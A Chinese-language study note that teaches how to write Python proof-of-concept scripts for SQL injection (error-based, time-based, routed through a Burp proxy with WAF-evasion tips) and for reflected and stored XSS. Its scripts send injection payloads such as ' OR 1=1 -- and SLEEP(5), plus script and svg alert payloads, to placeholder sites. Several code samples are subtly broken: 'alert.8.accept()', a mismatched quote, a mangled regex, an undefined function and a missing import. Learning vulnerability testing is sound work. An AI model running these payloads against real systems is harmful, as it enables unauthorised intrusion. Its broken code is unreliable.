# POC基础

**目录**：

一.POC基本编写验证思想

1.什么是POC

2.编写POC的基本步骤



二.SQL注入类型的POC编写

1.SQL注入的原理

2.Python具体实现

​     (1)基于错误信息的SQL注入检测编写

​     (2)时间盲注检测编写

​     (3)自动化代理测试（结合 Burp Suite）编写



三.XSS攻击型的POC编写

1.反射型XSS POC编写

​      (1)反射型XSS攻击流程分析

​      (2)反射型XSS POC原理

​      (3)Python具体实现

​      (4)进阶技巧

2.储存型XSS POC编写

​      (1)储存型XSS攻击流程分析

​      (2)储存型XSS POC原理

​      (3)Python具体实现



## 一.POC基本编写验证思想

#### 1.什么是POC

- 本质：一段简洁的代码或脚本。
- 作用：验证漏洞的存在，并展示其可利用性。

#### 2.编写POC的具体步骤

##### (1)明确漏洞目标

- *确定漏洞的具体类型*
  - SQL注入：通过注入恶意SQL语句来篡改数据库查询。
  - XSS攻击：通过注入恶意脚本到网页中，当这些脚本被浏览器执行时，可能会导致数据泄露。
  - 缓冲区溢出：通过向缓冲区写入超出其容量的数据，覆盖返回地址，从而控制程序的执行流程。
- *确定漏洞在系统中的具体位置*
  - 表单：如用户登录表单。
  - API接口：如用户注册接口。
  - 页面：如搜索结果页面.

- *明确POC需要达到的效果*
  - 弹出警告框：验证XSS漏洞。
  - 获取管理员权限：验证SQL注入或身份验证绕过漏洞。

##### (2)分析漏洞原理

- *确定触发漏洞的具体条件*

  - SQL注入：输入恶意SQL语句

    ~~~
    例：' OR '1'='1
    ~~~

  - XSS攻击：输入恶意脚本

    ~~~
    例：<script>alert('XSS')</script>
    ~~~

#####  (3)Python具体实现（以下步骤中的例子是在从后面我写的代码中随机取的，因为这部分是最后写的）

- *明确所要用到的库*，例：
  - 若要发送HTTP请求和处理响应：requests库
  - 若用于自动化Web浏览器操作：selenium库
  - 若用于在请求之间添加延迟：time库

- *定义检查函数*

~~~
例：def test_reflected_xss(target_url, param_name, payload):
~~~

- *构造恶意负载*

~~~
例：payload = "<svg onload=alert(1)>"
    # 定义一个字典，包含要提交的数据
    post_data = {'vulnerable_field': payload}  # 修改为实际参数名
~~~

- *发送请求*

~~~
例:session.post(target_url, data=post_data)
~~~

- *漏洞判断 (核心)*

~~~
例        alert = Alert(driver)
        # 检查警告框文本中是否包含"1"
        if "1" in alert.text:
            print(f"[+] 漏洞存在! Payload: {payload}")
            alert.8.accept()  # 如果存在弹窗，点击接受
            return True
        else:
            print("[-] 未检测到弹窗")
            return False
~~~

- *主函数*



## 二.SQL注入类型的POC编写

#### 1.SQL注入的原理

 SQL注入的核心在于攻击者通过控制输入数据，使这些数据被错误地解释为SQL命令的一部分，从而执行恶意的SQL语句。

例：假设有一个简单的用户登录表单，用户输入用户名和密码。后端代码如下

~~~php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($connection, $query);
~~~

如果用户在用户名输入框中输入 ' OR '1'='1 ，在密码输入框中输入 ' OR '1'='1，那么生成的SQL语句将变为

~~~sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';
~~~

由于  '1'='1'  始终为真，因此上述查询将返回所有用户的数据，攻击者可以绕过身份验证。



#### 2.Python具体实现

#### 基础模板(基于错误信息的SQL注入检测)



##### (1)构造检查函数，检查给定的URL是否存在SQL注入漏洞

~~~python
def check_sql_injection(url, param, value):
~~~

形参中包含三个参数：

url: 要检查的目标URL，应包含一个可注入的参数，例如：http://example.com/products?id=1

param: 要注入的参数名称，例如：'id'

value: 参数的原始值，例如：'1'

return: 一个元组，第一个元素是布尔值，表示是否存在漏洞；第二个元素是字符串，描述检测到的问题。



###### (2)构造恶意负载

~~~python
payload = value + "' OR 1=1 -- "
~~~

这里构造了一个恶意的SQL语句片段，目的是绕过SQL查询。例如，如果原始查询是：SELECT * FROM products WHERE id = '1' 注入后变为：SELECT * FROM products WHERE id = '1' OR 1=1 -- '这将导致查询返回所有记录，因为1=1始终为真。



##### (3)发送请求

~~~python
params = {param: payload}
~~~

将恶意负载添加到请求参数中。例如，如果param是'id'，value是'1'，那么params将是：{'id': "1' OR 1=1 -- "}



##### (4)发送包含恶意负载GET请求到目标URL

~~~python
 try:
        response = requests.get(url, params=params)
    except requests.exceptions.RequestException as e:
        return False, f"网络请求失败，原因: {e}"
~~~

其中，except requests.exceptions.RequestException as e:  是为了捕获网络请求中可能出现的异常，例如连接错误、超时等。



##### (5)漏洞判断

~~~python
 if "error" in response.text:
        return True, "SQL 语法错误暴露"
    if len(response.content) > 2 * len(requests.get(url).content):
        return True, "异常数据泄露"
    return False, "未检测到漏洞"
~~~

其中

if "error" in response.text:检查响应内容中是否包含SQL语法错误的提示。 如果包含，说明服务器执行了恶意SQL语句，可能存在SQL注入漏洞。

if len(response.content) > 2 * len(requests.get(url).content): 检查响应内容的长度是否异常增加。如果响应内容长度是正常请求的两倍以上，可能是因为注入导致返回了额外的数据。



##### (6)使用示例

~~~python
target_url = "http://example.com/products"
is_vuln, reason = check_sql_injection(target_url, "id", "1")
print(f"漏洞状态: {is_vuln}, 原因: {reason}")
~~~



以下是完整的代码示例：

~~~python
import requests

def check_sql_injection(url, param, value):
    # 构造恶意负载
    payload = value + "' OR 1=1 -- "  # 注释符绕过[^1]
    
    # 发送请求
    params = {param: payload}
    response = requests.get(url, params=params)
    
    # 漏洞判断
    if "error in your SQL syntax" in response.text:
        return True, "SQL 语法错误暴露"
    if len(response.content) > 2 * len(requests.get(url).content):
        return True, "异常数据泄露"
    return False, "未检测到漏洞"

# 使用示例
target_url = "http://example.com/products"
is_vuln, reason = check_sql_injection(target_url, "id", "1")
print(f"漏洞状态: {is_vuln}, 原因: {reason}")
~~~



以上是基于错误信息的SQL注入检测，但若当目标服务器配置了错误信息隐藏机制，不会返回SQL语法错误信息时，使用***时间盲注检测***。



#### 时间盲注检测

**核心思想：**时间盲注利用了数据库的**延时函数**（如MySQL的SLEEP()函数）来检测SQL注入漏洞:攻击者通过注入包含延时函数的SQL语句，使数据库在执行查询时故意延迟响应。如果**服务器响应时间显著增加**，说明注入的SQL语句被成功执行，从而确认存在SQL注入漏洞。

##### (1)构造检查函数，检查目标URL是否存在基于时间的SQL注入漏洞

~~~python
def check_time_based_injection(url, param):
~~~

形参中包含两个参数：

url: 要检查的目标URL，应包含一个可注入的参数，例如：http://example.com/login

param: 要注入的参数名称，例如：'username'

return: 如果检测到时间延迟，返回True和延迟时间；否则返回False



##### (2)构造时间延迟负载

~~~python
  payloads = [
        f"{param}' AND sleep(5) -- ",  # 第一个负载，使用AND语句和sleep函数
        f"{param}' UNION SELECT SLEEP(5) -- "  # 第二个负载，使用UNION SELECT语句和sleep函数
    ]
~~~

payloads  ：定义了一个包含两个恶意负载的列表。

这里构造了两个不同的恶意负载，目的是通过SQL注入使数据库执行一个延时操作。如果目标数据库支持sleep函数，注入后会导致数据库延迟响应。

例:如果param是'username'，那么payloads将是：['username\' AND sleep(5) -- ', 'username\' UNION SELECT SLEEP(5) -- ']



#####  (3)遍历每个负载，发送请求并测量响应时间

~~~python
for payload in payloads:
        start_time = time.time()  # 记录请求开始时间
        requests.get(url, params={param: payload})  # 发送带有恶意负载的GET请求
        response_time = time.time() - start_time  # 计算响应时间
         if response_time > 4:  # 阈值判断
            return True, f"检测到时间延迟: {response_time:.2f}s"  # 返回True和延迟时间
    return False  # 如果没有检测到时间延迟，返回False
~~~

如果响应时间超过设定的阈值（这里是4秒）则认为存在时间盲注漏洞。 这是因为正常情况下，请求的响应时间应该远小于5秒。



##### (4)使用示例

~~~
if check_time_based_injection("http://example.com/login", "username"):
    print("存在时间盲注漏洞！")
~~~

以下是完整的代码示例：

~~~python
import time

def check_time_based_injection(url, param):
    # 构造时间延迟负载
    payloads = [
        f"{param}' AND sleep(5) -- ",
        f"{param}' UNION SELECT SLEEP(5) -- "
    ]
    
    for payload in payloads:
        start_time = time.time()
        requests.get(url, params={param: payload})
        response_time = time.time() - start_time
        
        if response_time > 4:  # 阈值判断
            return True, f"检测到时间延迟: {response_time:.2f}s"
    return False

# 使用示例
if check_time_based_injection("http://test.com/login", "username"):
    print("存在时间盲注漏洞！")
~~~



#### 自动化代理测试（结合 Burp Suite）

**核心思想：**通过**代理服务器（如Burp Suite）**发送HTTP请求，测试目标URL是否存在SQL注入漏洞。因为某些目标系统可能配置了防火墙或WAF（Web应用防火墙），这些安全机制可能会阻止或限制直接的恶意请求。通过代理服务器，可以绕过这些限制。

假设目标Web应用的URL是 http://vuln-site.com/item，并且该应用配置了WAF，会阻止包含  ' OR 1=1 ’ 等恶意SQL语句的请求。那我们就要使用代理服务器去绕过WAF。具体分为四步：

##### (1)启动Burp Suite并配置代理

- 启动Burp Suite
  - 打开Burp Suite,选择“Proxy”选项卡，确保代理功能已启用。
  - 确保Burp Suite正在监听127.0.0.1:8080。

- 在你的浏览器中，配置代理设置，使其指向127.0.0.1:8080。

![屏幕截图 2025-07-28 160213](C:\Users\Tong\Pictures\Screenshots\屏幕截图 2025-07-28 160213.png)

##### (2)发送请求并通过Burp Suite拦截

- 拦截请求
  - 在Burp Suite中，选择“Proxy”选项卡，然后选择“Intercept”子选项卡。
  - 确保“Intercept is on”选项被选中，这样Burp Suite会拦截所有通过它的请求。

- 发送请求

**以下是书写Python代码的步骤**



**(1)代理服务器配置**

proxies字典定义了HTTP和HTTPS代理服务器的地址。

~~~~python
proxies = {
    'http': 'http://127.0.0.1:8080',  # HTTP代理地址
    'https': 'http://127.0.0.1:8080'  # HTTPS代理地址
}  
~~~~



**(2) 函数定义**

~~~py
def test_with_proxy(url, payload):
~~~

定义了一个函数，用于通过代理服务器发送HTTP请求，并测试目标URL是否存在SQL注入漏洞。

url：目标URL，例如http://vuln-site.com/item。

payload：要注入的恶意负载，例如  '1' AND 1=1 --。



**(3)发送GET请求**

~~~python
 try:
        response = requests.get(
            url, 
            params={"id": payload}, 
            proxies=proxies, 
            verify=False )
~~~

params={"id": payload}： 将恶意负载作为参数传递。

proxies=proxies：指定使用代理服务器。

verify=False：忽略证书验证，适用于HTTPS请求。



**(4)异常处理**

~~~python
  try:
        response = requests.get(
            url, 
            params={"id": payload},
            proxies=proxies,
            verify=False)
        # 打印响应状态码和响应长度
        print(f"状态码: {response.status_code}, 响应长度: {len(response.text)}")
    except Exception as e:
        # 捕获并打印异常信息
        print(f"代理请求异常: {e}")
~~~

使用try...except捕获可能的异常，例如网络连接问题或代理服务器配置错误。如果发生异常，打印异常信息。



**(5)测试不同负载**

~~~                                python
test_with_proxy("http://vuln-site.com/item", "1' AND 1=1 -- ")  # 测试条件为真的情况
test_with_proxy("http://vuln-site.com/item", "1' AND 1=2 -- ")  # 测试条件为假的情况
~~~

调用test_with_proxy函数，测试两个不同的恶意负载：

1' AND 1=1 -- ：条件为真，用于测试是否存在SQL注入漏洞。

1' AND 1=2 -- ：条件为假，用于测试正常情况。



完整代码如下：

~~~python
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def test_with_proxy(url, payload):
    try:
        response = requests.get(
            url, 
            params={"id": payload},
            proxies=proxies,
            verify=False 
        )
        print(f"状态码: {response.status_code}, 响应长度: {len(response.text)}")
    except Exception as e:
        print(f"代理请求异常: {e}")


test_with_proxy("http://vuln-site.com/item", "1' AND 1=1 -- ")
test_with_proxy("http://vuln-site.com/item", "1' AND 1=2 -- ")
~~~



##### (3)查看请求内容，确认恶意负载被正确发送

- 查看请求内容：在Burp Suite的“Intercept”子选项卡中，你会看到发送到http://vuln-site.com/item的请求。

- 确认恶意负载1' AND 1=1 -- 被正确发送。

##### (4)如果WAF阻止了请求，尝试修改请求内容以绕过检测

可以尝试以下方法：

- 使用注释符：在恶意负载中添加注释符，绕过WAF的检测。

~~~python
test_with_proxy("http://vuln-site.com/item", "1' AND 1=1 /*")
~~~

- 改请求头：在请求中添加或修改某些头信息，绕过WAF的检测。

~~~python
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Referer': 'http://vuln-site.com/'
}
response = requests.get(
    url,
    params={"id": payload},
    headers=headers,
    proxies=proxies,
    verify=False)
~~~

***



##  三.XSS攻击型的POC编写

#### 1.反射型XSS POC编写



#####  (1)反射型XSS攻击流程

- 攻击者构造恶意URL（含XSS payload），通过电子邮件，QQ等渠道，将恶意URL发送给目标用户。

例：假设目标网站的搜索功能存在XSS漏洞，攻击者构造以下恶意链接：

~~~
http://example.com/search?query=<script>alert('XSS')</script>
~~~

- 用户点击该URL，浏览器向目标网站发送请求。
- 目标网站接收到用户的请求，并将用户输入的参数（如query）直接嵌入到HTML页面中，而没有进行适当的过滤或编码。

例：目标网站的搜索功能将用户输入的  query  参数直接嵌入到HTML页面中

~~~
<h1>Search Results for: <script>alert('XSS')</script></h1>
~~~

- 恶意脚本被浏览器执行，实现攻击目标（在这里的具体表现是弹出一个弹窗）



##### (2)**反射型XSS POC原理**

~~~
A[构造恶意URL] --> B[发送HTTP请求]
B --> C{响应分析}
      C -->|包含原始payload| D[漏洞存在]
      C -->|包含编码payload| E[过滤机制分析]
      C -->|无匹配内容| F[漏洞不存在]
~~~



##### (3)书写Python代码的步骤

**1.库的使用**

- requests库：用于发送HTTP请求和处理响应。
- urllib.parse库：Python标准库中的一个模块，这里主要是使用了这个库中的quote_plus函数对函数对payload进行URL编码。具体体现在第三步。



**2.函数定义**

~~~python
def test_reflected_xss(target_url, param_name, payload):
~~~

定义了一个函数，用于检测目标URL是否存在反射型XSS漏洞。

target_url：目标URL，不包含参数。

param_name：待测试的参数名。

payload：XSS测试负载。



**3.编码payload防止URL解析错误**

~~~python
 encoded_payload = quote_plus(payload)
~~~

使用quote_plus对payload进行URL编码，防止URL解析错误。

例：<script>alert('XSS')</script>  会被编码为  %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E  



*为什么在XSS漏洞检测中需要对payload进行URL编码？*

- URL编码（也称为百分号编码）：是一种编码机制，用于将URL中的特殊字符转换为%加两位十六进制数的形式。这种编码方式可以确保URL中的特殊字符不会被误解为URL的分隔符或其他控制字符，从而避免URL解析错误。
  -  空格会被编码为+。
  -  /  会被编码为%2F。
  -  ?  会被编码为%3F。

- XSS漏洞检测中，payload通常包含一些特殊字符，如  <  、  >  、  "  、  '  等。这些字符在URL中具有特殊含义，如果不进行编码，可能会导致以下问题
  - URL解析错误：如果payload中包含特殊字符（如  &  、  =  ），这些字符可能会被误解为URL的参数分隔符或键值对分隔符，从而导致URL解析错误。
  - 确保payload正确传递：确保payload中的特殊字符被正确处理，不会被误解为URL的一部分。

**4.构造恶意URL**

~~~python
malicious_url = f"{target_url}?{param_name}={encoded_payload}"
~~~

将编码后的payload拼接到目标URL中，构造恶意URL。

例：http://vuln-site.com/search?query=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E。



**5.发送请求**

~~~python
try:
      headers = {
          "User-Agent": "XSS-POC-Scanner/1.0",
          "Accept": "text/html"
        }
        response = requests.get(malicious_url, headers=headers, timeout=8)
~~~

使用 requests.get发送GET请求到恶意URL。设置了常见的请求头，如  User-Agent  和  Accept  ，以模拟正常浏览器行为。



**6.检测响应（核心）**

~~~python
 # 检测响应中是否包含原始payload（基础检测）
        if payload in response.text:
            return True
        
        # 进阶检测：HTML实体编码绕过
        if any(entity in response.text for entity in 
               [payload.replace("<", "&lt;"), payload.replace(">", "&gt;")]):
            print("[!] 检测到过滤机制：HTML实体编码")
            return False
            
        # 响应内容分析（正则表达式检测）
        import re
        if re.search(r"alert $.+?$ ", response.text):
            return True
~~~

**基础检测：检查响应内容中是否包含原始payload。**

原理：如果目标页面将用户输入直接嵌入到HTML中，而没有进行任何过滤或编码，那么原始的payload就会出现在响应内容中。

例：恶意URL：http://vuln-site.com/search?query=<script>alert('XSS')</script>  

​        响应内容：<h1>Search Results for: <script>alert('XSS')</script></h1>  

​        检测结果：如果  <script>alert('XSS')</script>  出现在响应内容中，返回 True  ，表示存在XSS漏洞。



**进阶检测：检查响应内容中是否包含HTML实体编码的payload。**

原理：如果目标页面对用户输入进行了HTML实体编码，那么  <  会被编码为&lt； >  会被编码为&gt；这种编码可以防止HTML标签被浏览器解析为可执行代码。

例：恶意URL： http://vuln-site.com/search?query=<script>alert('XSS')</script>  

​       响应内容：`<h1>Search Results for:&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</h1>  `。

​       检测结果：如果`  &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;  `出现在响应内容中，打印  [!] 检测到过滤机制：HTML实体编码，返回  False，表示存在过滤机制，但不一定存在XSS漏洞。



**正则表达式检测：使用正则表达式检查响应内容中是否包含 alert()函数。**

作用：使用正则表达式检查响应内容中是否包含特定的JavaScript函数调用，如alert() 。

原理：即使目标页面对payload进行了某些过滤或编码，但仍然可能执行恶意脚本。通过正则表达式检测响应内容中是否存在alert()函数调用，可以进一步确认XSS漏洞。

例：恶意URL：http://vuln-site.com/search?query=<script>alert('XSS')</script>  

​       响应内容：  <h1>Search Results for: <script>alert('XSS')</script></h1>  

​       检测结果：如果正则表达式alert $.+?$ 匹配到响应内容中的  alert('XSS')  ，返回 True ，表示存在XSS漏洞。



**7.异常处理**

~~~python
 except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {e}")
    
    return False
~~~

捕获可能的网络请求异常，并打印错误信息。



**8.主程序**

~~~python
if __name__ == "__main__":
    TARGET = "http://vuln-site.com/search"
    PARAM = "query"
    
    PAYLOAD = "<script>alert('XSS_POC_安全测试')</script>"
    
    if test_reflected_xss(TARGET, PARAM, PAYLOAD):
        print(f"[+] 存在反射型XSS漏洞: {TARGET}?{PARAM}=[payload]")
    else:
        print("[-] 未检测到反射型XSS漏洞")
~~~

配置了目标URL、参数名和测试负载。并调用test_reflected_xss函数，执行反射型XSS漏洞检测。根据检测结果，输出是否存在漏洞。

完整代码如下

~~~python
import requests
from urllib.parse import quote_plus

def test_reflected_xss(target_url, param_name, payload):
   
    # 编码payload防止URL解析错误
    encoded_payload = quote_plus(payload)
    
    # 构造恶意URL
    malicious_url = f"{target_url}?{param_name}={encoded_payload}"
    
    try:
        # 发送请求
        headers = {
            "User-Agent": "XSS-POC-Scanner/1.0",
            "Accept": "text/html"
        }
        response = requests.get(malicious_url, headers=headers, timeout=8)
        
        # 检测响应中是否包含原始payload（基础检测）
        if payload in response.text:
            return True
        
        # 进阶检测：HTML实体编码绕过
        if any(entity in response.text for entity in 
               [payload.replace("<", "&lt;"), payload.replace(">", "&gt;")]):
            print("[!] 检测到过滤机制：HTML实体编码")
            return False
            
        # 响应内容分析（正则表达式检测）
        import re
        if re.search(r"alert $.+?$ ", response.text):
            return True
            
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {e}")
    
    return False

if __name__ == "__main__":

    TARGET = "http://vuln-site.com/search"
    PARAM = "query“
    PAYLOAD = "<script>alert('XSS_POC_安全测试')</script>"

    if test_reflected_xss(TARGET, PARAM, PAYLOAD):
        print(f"[+] 存在反射型XSS漏洞: {TARGET}?{PARAM}=[payload]")
    else:
        print("[-] 未检测到反射型XSS漏洞")
~~~



##### (4)进阶扩展

- **多Payload测试**

~~~python
PAYLOADS = [
    "<script>alert(1)</script>",
    "\"onfocus=\"alert(1)",
    "<a href=\"javascript:alert(1)\">"
]

for payload in PAYLOADS:
    result = check_reflected_xss(TARGET, PARAM, payload)
~~~

- **自动化参数发现**

原理：使用BeautifulSoup库，用于从一个HTML页面中提取所有某一个标签的name 属性。

例：

~~~python
from bs4 import BeautifulSoup
import requests

def find_params(url):
    
    # 发送GET请求获取目标页面的HTML内容
    res = requests.get(url)
    
    # 使用BeautifulSoup解析HTML内容
    soup = BeautifulSoup(res.text, 'html.parser')
    
    # 提取所有<input>标签的name属性
    return [tag['name'] for tag in soup.find_all('input') if 'name' in tag.attrs]

~~~

***

#### 2.储存型XSS POC编写

#####  (1)储存型XSS攻击流程

- 攻击者构造一个包含恶意脚本的payload，例如：<svg onload=alert(1)>
- 通过目标网站的表单、评论框或其他输入字段，攻击者提交含有XSS payload的数据。
- 目标网站的服务器接收并存储含有恶意payload的数据，通常在数据库中。
- 当其他用户访问包含恶意数据的页面时，存储在服务器上的恶意脚本被检索并发送到用户的浏览器。
- 用户的浏览器接收并执行恶意脚本，攻击者成功利用XSS漏洞。
-  恶意脚本可以窃取用户数据、会话信息、操纵用户在网站上的行为等。

##### (2)书写Python代码的步骤

**1.库的使用**

- requests库：用于发送HTTP请求和处理响应。requests.Session()  用于创建一个会话对象，该对象可以保持某些参数，比如cookies，在多个请求之间持久化。

- selenium库：用于自动化Web浏览器操作。
- time库：用于在请求之间添加延迟。这可以确保服务器有足够的时间处理请求（在发送恶意payload后）以及页面有足够的时间加载（在检查警告框前）。

**2.函数定义**

~~~python
def test_stored_xss(target_url, display_url, login_url=None, creds=None):
~~~

定义了一个函数，用于检测存储型XSS漏洞。

**target_url**：这是存储型XSS漏洞的目标URL。是攻击者用来提交包含XSS payload的数据的地方。在函数内部，这个URL用于发送一个包含恶意payload的POST请求，以尝试在目标网站上存储恶意脚本。

**display_url**：这是显示URL，即存储XSS漏洞的数据展示地址。当其他用户访问这个页面时，如果存在XSS漏洞，恶意脚本会被检索并发送到用户的浏览器中。在函数内部，这个URL用于启动Selenium WebDriver，模拟浏览器访问该页面并检查是否触发了XSS攻击（例如，是否弹出警告框）。

**login_url**：这是登录URL，如果目标网站需要用户认证，那么这个参数就是用来指定登录页面的URL。

**creds**：这是一个字典，包含了登录所需的凭据，如用户名和密码。

**3.初始化会话**

~~~python
session = requests.Session() 
~~~

使用requests.Session()**保持会话状态**。在Web应用中，用户登录后，服务器通常会创建一个会话，并通过设置cookie等方式在用户的后续请求中识别用户身份。保持会话状态允许服务器记住用户已经通过认证，从而无需在每个请求中重新登录。

**4. 登录处理**

~~~python
if login_url and creds:
       session.post(login_url, data=creds)
~~~

如果提供了登录URL和creds，则发送POST请求进行登录。

**5.构造payload**

~~~py
    payload = "<svg onload=alert(1)>"
    # 定义一个字典，包含要提交的数据
    post_data = {'vulnerable_field': payload}  # 修改为实际参数名
~~~

`<svg>`这个标签利用了SVG（可缩放矢量图形）元素的onload事件，当SVG图像加载时会触发  alert(1)  函数，弹出一个警告框显示数字1。

 post_data:是一个字典，它定义了要通过POST请求发送到目标服务器的数据。

**6.发送POST请求**

~~~
session.post(target_url, data=post_data)
    time.sleep(3)  # 等待服务器处理:发送请求到服务器后，可能需要等待一段时间以确保服务器有足够的时间处理请求并返回响应。
~~~

使用requests.Session()发送POST请求到目标URL，提交恶意数据。

**7.验证执行**

使用Selenium启动Chrome浏览器，访问显示URL。等待页面加载。检测警告框，如果警告框文本中包含"1"，则接受警告框。

~~~py
driver = webdriver.Chrome()
    try:
        # 访问显示URL
        driver.get(display_url)
        time.sleep(3)  # 等待页面加载
        
        # 检测弹窗
        # 获取页面上的警告框
        alert = Alert(driver)
        # 检查警告框文本中是否包含"1"
        if "1" in alert.text:
            print(f"[+] 漏洞存在! Payload: {payload}")
            alert.8.accept()  # 如果存在弹窗，点击接受
            return True
        else:
            print("[-] 未检测到弹窗")
            return False
~~~

Alert是 Selenium WebDriver 中用于处理浏览器弹出警告框（alert）的一个类。这里是为了获取页面上的警告框。

**8.异常处理**

~~~py
except Exception as e:
        # 如果发生异常，打印异常信息
        print(f"[-] 验证异常: {str(e)}")
        return False
~~~

**9.关闭浏览器**

~~~py
 finally:
        # 无论测试结果如何，都关闭浏览器
        driver.quit()
~~~

**10.主程序**

~~~python
if __name__ == "__main__":
    # 目标URL，即存储XSS漏洞的数据提交地址
    TARGET = "http://vuln-site.com/comment.php"  
    # 数据展示页面URL
    DISPLAY = "http://vuln-site.com/comments.php" 
    # 登录URL
    LOGIN = "http://vuln-site.com/login.php"
    # 登录凭据
    CREDS = {'username': 'test', 'password': 'test123'}    
    # 执行存储型XSS测试
    test_stored_xss(TARGET, DISPLAY, LOGIN, CREDS)
~~~

配置了目标URL、显示URL、登录URL和登录凭据。

调用  test_stored_xss  函数，执行存储型XSS漏洞检测。

根据检测结果，输出是否存在漏洞。

完整代码如下：

~~~python
import requests
from selenium import webdriver
from selenium.webdriver.common.alert import Alert
import time

def test_stored_xss(target_url, display_url, login_url=None, creds=None):
   
    # 初始化会话
    session = requests.Session()    
    # 处理认证
    if login_url and creds:
        session.post(login_url, data=creds)

    payload = "<svg onload=alert(1)>"
    post_data = {'vulnerable_field': payload}  # 修改为实际参数名
    
    session.post(target_url, data=post_data)
    time.sleep(3)  # 等待服务器处理
  
    driver = webdriver.Chrome()
    try:
        driver.get(display_url)
        time.sleep(3) 
        
        # 获取页面上的警告框
        alert = Alert(driver)
        if "1" in alert.text:
            print(f"[+] 漏洞存在! Payload: {payload}")
            alert.accept()  # 如果存在弹窗，点击接受
            return True
        else:
            print("[-] 未检测到弹窗")
            return False
    except Exception as e:
        print(f"[-] 验证异常: {str(e)}")
        return False
    finally:
        driver.quit()

if __name__ == "__main__":
    TARGET = "http://vuln-site.com/comment.php"  
    DISPLAY = "http://vuln-site.com/comments.php" 
    LOGIN = "http://vuln-site.com/login.php"
    CREDS = {'username': 'test', 'password': 'test123'}    
    test_stored_xss(TARGET, DISPLAY, LOGIN, CREDS)
~~~

****